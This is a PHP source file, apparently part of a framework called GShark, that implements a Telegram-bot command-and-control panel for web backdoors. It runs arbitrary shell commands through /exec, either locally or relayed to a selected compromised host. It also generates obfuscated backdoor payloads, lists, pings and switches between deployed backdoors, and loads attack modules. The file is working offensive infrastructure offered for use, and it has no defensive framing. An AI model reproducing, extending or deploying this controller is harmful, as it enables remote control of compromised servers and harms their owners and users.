<?php

namespace System\Command;

use Database\Database;
use System\Backdoors\Backdoor;
use System\Configuration;
use Classes\GlobalAction;
use System\Templates\Template;
use \PDO;

class CommandMaster extends Command
{
    protected $configuration;
    protected $commandArgv = [];
    protected $commandArgc = 0;
    protected $command;
    protected $backdoor;

    public function __construct($command, $commandArgv, $commandArgc, $chat_id)
    {
        $this->configuration = Configuration::getConfigElement();
        $this->bot = $this->configuration->telegram->bot_id;
        $this->chat_id = $chat_id;
        $this->command = $command;
        $this->commandArgc = $commandArgc;
        $this->commandArgv = $commandArgv;
        $this->bdd = Database::get_database();
        $this->backdoor = new CommandBackdoor($this->command, $this->commandArgv, $this->commandArgc, $this->chat_id);
    }


    public function executeCmd($method)
    {
        if(method_exists($this, $method))
        {
            if($this->checkUser())
            {
                $this->$method();
                return true;
            }
        }
        return false;
    }

    protected function helpBulletMaster()
    {
        $command_list_master = (array) $this->configuration->commands->master;
        foreach ($command_list_master as $key => $value) {
            if($command_list_master[$key]->type == "master" || $command_list_master[$key]->type == "both")
            {
                GlobalAction::sendMessage(''.$key.' _'.$command_list_master[$key]->description.'_', $this->chat_id);
            }
        }
    }

    protected function helpBulletBackdoor()
    {
        $command_list_master = (array) $this->configuration->commands->master;
        foreach ($command_list_master as $key => $value) {
            if($command_list_master[$key]->type == "backdoor" ||  $command_list_master[$key]->type == "both")
            {
                GlobalAction::sendMessage(''.$key.' _'.$command_list_master[$key]->description.'_', $this->chat_id);
            }
        }
    }

    protected function show_help()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*information:* You can use /help master or /help backdoor', $this->chat_id);
            $command_list_master = (array) $this->configuration->commands->master;
            foreach ($command_list_master as $key => $value) {
                GlobalAction::sendMessage(''.$key.' _'.$command_list_master[$key]->description.'_', $this->chat_id);
            }
            return true;
        }
        elseif($this->commandArgv[0] == "master")
        {
            $this->helpBulletMaster();
            return true;
        }
        elseif($this->commandArgv[0] == "backdoor")
        {
            $this->helpBulletBackdoor();
            return true;
        }
        return false;
    }

    protected function useModule()
    {
        if(Database::updateModule($this->commandArgv[1]))
        {
            $class = class_exists("\Modules\\".$this->commandArgv[1]);
            if($class)
            {
                GlobalAction::sendMessage('Current module : _'.$this->commandArgv[1].'_', $this->chat_id);
                GlobalAction::sendMessage('Use */getpayload* for show current payload code', $this->chat_id);
                GlobalAction::sendMessage('Use */module_help* for show help module bullet', $this->chat_id);
                GlobalAction::sendMessage('Please set required argument with /set <argument> <value>', $this->chat_id);
                GlobalAction::sendMessage('------', $this->chat_id);
                $class = "\Modules\\".$this->commandArgv[1];
                $class = new $class($this->chat_id);
                Database::saveModule($class);
                $arguments = $class->showArgument();
                if(count($arguments) < 1)
                {
                    GlobalAction::sendMessage('No argument needed for this module', $this->chat_id);
                }
                else
                {
                    foreach ($arguments as $argument) {
                        GlobalAction::sendMessage($argument, $this->chat_id);
                    }

                }
            }
            else
            {
                GlobalAction::sendMessage('Error: This module not correct configured', $this->chat_id);
            }
            //\Modules\executeModule::showArgument();
        }
        else
            GlobalAction::sendMessage('* Error in module use', $this->chat_id);
    }

    protected function useElement()
    {
        if($this->commandArgc < 2)
        {
            GlobalAction::sendMessage('*error:* incorrect syntax please use eg: _/use <element> <Name>_', $this->chat_id);
            die();
        }
        if($this->commandArgv[0] == "module")
        {
            $this->useModule();
        }
    }

    protected function setModuleArgument()
    {
        $module = Database::getCurrentModuleSession();
        if($module === false)
        {
            GlobalAction::sendMessage('*error:* please select module e.g:  _/use <module>_', $this->chat_id);
            return false;
        }
        $argument = $this->commandArgv;
        if(count($argument) < 2 || count($argument) > 2)
        {
            GlobalAction::sendMessage('*error:* incorrect syntax e.g:  _/set <argument> <value>_', $this->chat_id);
            return false;
        }
        if(Database::getCurrentModuleName() !== false)
        {
            $argument_base = $argument[0];
            $argument_value = $argument[1];
            if($module->setArgument($argument_base,$argument_value) !== false)
            {
                Database::saveModule($module);
                GlobalAction::sendMessage('Argument successfully setup', $this->chat_id);
                return true;
            }
            return false;
        }
        GlobalAction::sendMessage("No module selected please use */use <ModuleName>*", $this->chat_id);
        return false;
    }

    protected function getModulePayload()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*error:* please select type (decode,raw) like e.g: /getpayload raw', $this->chat_id);
            GlobalAction::sendMessage('_Decode is for base64 payload encoded', $this->chat_id);
            return false;
        }
        $type = $this->commandArgv[0];
        $module = Database::getCurrentModuleSession();
        if($module === false)
        {
            GlobalAction::sendMessage('*error:* please select module e.g:  _/use <module>_', $this->chat_id);
            return false;
        }
        if($module->getPayload($type) !== false)
        {
            GlobalAction::sendMessage($module->getPayload($type), $this->chat_id);
            Database::saveModule($module);
        }
        else
        {
            GlobalAction::sendMessage('*error:* Module don\'t have payload or decode type is unknow', $this->chat_id);
        }
    }

    protected function reboot()
    {
        Database::resetFramework();
        GlobalAction::sendMessage("reboot: *OK*", $this->chat_id);
        $this->getResume();
    }

    protected function executeModule()
    {
        $module = Database::getCurrentModuleSession();
        if($module === false)
        {
            GlobalAction::sendMessage('*error:* please select module e.g:  _/use <module>_', $this->chat_id);
            return false;
        }
        if($module->run() !== false)
        {
            $current = Database::backdoor_selected();
            if($current == "master")
            {
                Database::saveModule($module);
                GlobalAction::sendMessage('Module executed', $this->chat_id);
            }
            return true;
        }
        return false;
    }

    protected function showModules()
    {
        GlobalAction::sendMessage('select module with : *use module <payload>*', $this->chat_id);
        $module_list = $this->configuration->modules;
        foreach ($module_list as $module)
        {
            GlobalAction::sendMessage('- '.$module->name . '    _'.$module->description.'_', $this->chat_id);
        }
    }

    protected function shellExecute()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*error:* syntax', $this->chat_id);
            GlobalAction::sendMessage('*usage:* _/exec <cmd>_', $this->chat_id);
            return false;
        }
        if(Database::backdoor_selected() == "master")
        {
            GlobalAction::sendMessage('Execute on : _'.__FILE__.'_',$this->chat_id);
            $row = exec(implode(' ',$this->commandArgv),$output,$error);
            while(list(,$row) = each($output)){
                GlobalAction::sendMessage($row, $this->chat_id);
            }
            if($error){
                GlobalAction::sendMessage("*error:* Can't load command", $this->chat_id);
                die();
            }
            return true;
        }
        else
        {
            GlobalAction::sendMessage('_Send message to : '.Database::backdoor_selected().'_', $this->chat_id);
            $result = Backdoor::execCmdBackdoor(implode(' ',$this->commandArgv));
            if($result != "")
            {
                GlobalAction::sendMessage($result, $this->chat_id);
                return true;
            }
            GlobalAction::sendMessage('_Command executed but empty return_', $this->chat_id);
            return true;
        }

    }


    protected function masterWelcome()
    {
        GlobalAction::sendMessage('Welcome to GShark framework.', $this->chat_id);
        GlobalAction::sendMessage('Client id '.$this->chat_id, $this->chat_id);
        GlobalAction::sendMessage('Command list /help', $this->chat_id);
        $this->getResume();
    }

    protected function getResume()
    {
        GlobalAction::sendMessage('Resume of _master_ server', $this->chat_id);
        GlobalAction::sendMessage('_target_        *'.__FILE__."*", $this->chat_id);
        GlobalAction::sendMessage('_directory_     *'.__DIR__."*", $this->chat_id);
        GlobalAction::sendMessage('_hostname_      *'.gethostname()."*", $this->chat_id);
        if(!Database::getCurrentModuleName())
            GlobalAction::sendMessage('_Module_        * No module selected *', $this->chat_id);
        else
            GlobalAction::sendMessage('_Module_        *'.Database::getCurrentModuleName()."*", $this->chat_id);
        if(!Database::backdoor_selected() || Database::backdoor_selected() == "master")
            GlobalAction::sendMessage("_Target_       * No target selected *", $this->chat_id);
        else
            GlobalAction::sendMessage("_Target_       *".Database::backdoor_selected()."*", $this->chat_id);
    }

    protected function listPayload()
    {
        if(Template::listTemplatePayload() !== false)
        {
            GlobalAction::sendMessage('generate payload with : */generate payload <payload>*', $this->chat_id);
            $list = Template::listTemplatePayload();
            foreach ($list as $value)
            {
                GlobalAction::sendMessage($value->name."       _".$value->description."_", $this->chat_id);
            }
        }
    }

    protected function generatePayload()
    {
        $payloadName = $this->commandArgv[1];
        $return = Template::generateTemplate($payloadName);
        if($return === false)
        {
            GlobalAction::sendMessage('*error:* invalid payload name', $this->chat_id);
            $this->listPayload();
            return false;
        }
        GlobalAction::sendMessage('Backdoor as been generated to output folder', $this->chat_id);
        GlobalAction::sendMessage('Path: _/Ouput/'.$return.'_', $this->chat_id);
        return true;
    }

    protected function generateElement()
    {
        if($this->commandArgc == 2)
        {
            if($this->commandArgv[0] == "payload")
                $this->generatePayload();
            else
            {
                GlobalAction::sendMessage('*error:* _Unknow command please use like e.g: /generate payload Executor_', $this->chat_id);
            }
        }
        else
        {
            GlobalAction::sendMessage('*error:* invalid syntax please use eg: /generate payload <payloadName>', $this->chat_id);
        }
    }

    protected function listBackdoor()
    {
        $backdoorList = Database::getBackdoorList();
        if($backdoorList === false)
        {
            GlobalAction::sendMessage('No backdoor available for this moment.', $this->chat_id);
            return false;
        }
        foreach ($backdoorList as $backdoor)
        {
            $indentifier = $backdoor->backdoor_identifier;
            $url = $backdoor->backdoor_url;
            $date = $backdoor->created_at;
            GlobalAction::sendMessage('*'.$indentifier.'* _'.$url.' ('.$date.')_', $this->chat_id);
        }
        return true;
    }

    protected function listElement()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*error:* syntax error please e.g: /list <backdoor>', $this->chat_id);
            return false;
        }
        if($this->commandArgv[0] == "backdoor")
        {
            $this->listBackdoor();
            return true;
        }
        return true;
    }

    protected function interactWith()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*error:* syntax error please e.g: /interact <backdooridentifier>', $this->chat_id);
            return false;
        }
        if($this->commandArgv[0] == 'master')
        {
            Database::insertBackdoorSelected('master');
            GlobalAction::sendMessage('_Master server successfully selected_', $this->chat_id);
            return true;
        }
        $return = Database::insertBackdoorSelected($this->commandArgv[0]);
        if($return === false)
        {
            GlobalAction::sendMessage('*error:* invalid backdoor identifier', $this->chat_id);
            return false;
        }
        GlobalAction::sendMessage('_Backdoor successfully selected_', $this->chat_id);
    }

    protected function pingBackdoor()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*error:* syntax incorrect please use /ping <backdoorIdentifier>', $this->chat_id);
            return false;
        }
        if(Backdoor::pingBackdoor($this->commandArgv[0]))
        {
            GlobalAction::sendMessage('_Backdoor seem be_ *alive*', $this->chat_id);
            return true;
        }
        GlobalAction::sendMessage('_Backdoor seem be_ *down* _or incorrect identifier_', $this->chat_id);
        return false;
    }

    protected function showTarget()
    {
        $target = Database::backdoor_selected();
        if($target !== false)
        {
            GlobalAction::sendMessage('Current target : _'.$target.'_', $this->chat_id);
            $current_module = Database::getCurrentModuleName();
            if($current_module !== false)
                GlobalAction::sendMessage('Current module : _'.$current_module.'_', $this->chat_id);
            else
                GlobalAction::sendMessage('Current module : *No module selected*', $this->chat_id);
            return true;
        }
        GlobalAction::sendMessage('Current target : *Unknow target*', $this->chat_id);
        return false;
    }

    protected function showConfigElement()
    {
        if($this->commandArgc < 2)
        {
            GlobalAction::sendMessage('*error:* syntax error', $this->chat_id);
            GlobalAction::sendMessage('*usage:* _/config get/set/remove <element>_', $this->chat_id);
            GlobalAction::sendMessage('*Proxy e.g:* _/config get proxy_', $this->chat_id);
            GlobalAction::sendMessage('*Available config:*', $this->chat_id);
            GlobalAction::sendMessage('proxy            _configure HTTP (only) proxy_', $this->chat_id);
            GlobalAction::sendMessage('autogenerate     _Generate new backdoor offuscated code when interact_', $this->chat_id);
            GlobalAction::sendMessage('lockconnect      _Lock master server after 3 try with no admin telegram account_', $this->chat_id);
            return false;
        }
        if(strtolower($this->commandArgv[0]) == "get")
        {
            $setConfig = Configuration::$getElement;
            if(isset($setConfig[$this->commandArgv[1]]))
            {
                $function = $setConfig[$this->commandArgv[1]];
                $execute = Configuration::$function();
                if($execute !== false)
                {
                    if($execute === true)
                    {
                        GlobalAction::sendMessage('_set as a success_', $this->chat_id);
                    }
                    else
                    {
                        GlobalAction::sendMessage($execute, $this->chat_id);
                    }
                    return true;
                }
                else
                {
                    GlobalAction::sendMessage('error as been occured', $this->chat_id);
                    return false;
                }
            }
        }
        elseif(strtolower($this->commandArgv[0]) == "set")
        {
            $setConfig = Configuration::$setElement;
            if(isset($setConfig[$this->commandArgv[1]]))
            {
                $function = $setConfig[$this->commandArgv[1]];
                $execute = Configuration::$function($this->commandArgv);
                if($execute !== false)
                {
                    if($execute === true)
                    {
                        GlobalAction::sendMessage('_set as a success_', $this->chat_id);
                    }
                    else
                    {
                        GlobalAction::sendMessage($execute, $this->chat_id);
                    }
                    return true;
                }
                else
                {
                    GlobalAction::sendMessage('error as been occured', $this->chat_id);
                    return false;
                }
            }
        }
        elseif(strtolower($this->commandArgv[0]) == "remove")
        {
            $removeConfig = Configuration::$removeElement;
            if(isset($removeConfig[$this->commandArgv[1]]))
            {
                $function = $removeConfig[$this->commandArgv[1]];
                $execute = Configuration::$function();
                if($execute !== false)
                {
                    GlobalAction::sendMessage('configuration successfully deleted', $this->chat_id);
                    return true;
                }
                else
                {
                    GlobalAction::sendMessage('error as been occured', $this->chat_id);
                    return false;
                }
            }
        }
        else
        {
            GlobalAction::sendMessage('*error:* syntax error please use *set* or *get* E.g: /config get <element>', $this->chat_id);
            return false;
        }
    }

    public function removeBackdoor()
    {
        if($this->commandArgc < 1)
        {
            GlobalAction::sendMessage('*error:* syntax', $this->chat_id);
            GlobalAction::sendMessage('*usage:* /remove <backdoorIdentifier>', $this->chat_id);
            return false;
        }
        $identifier = $this->commandArgv[0];
        if(Database::removeBackdoor($identifier))
        {
            GlobalAction::sendMessage('_Backdoor as been removed_', $this->chat_id);
            return true;
        }
        GlobalAction::sendMessage('*error:* incorrect identifier', $this->chat_id);
        return false;
    }

}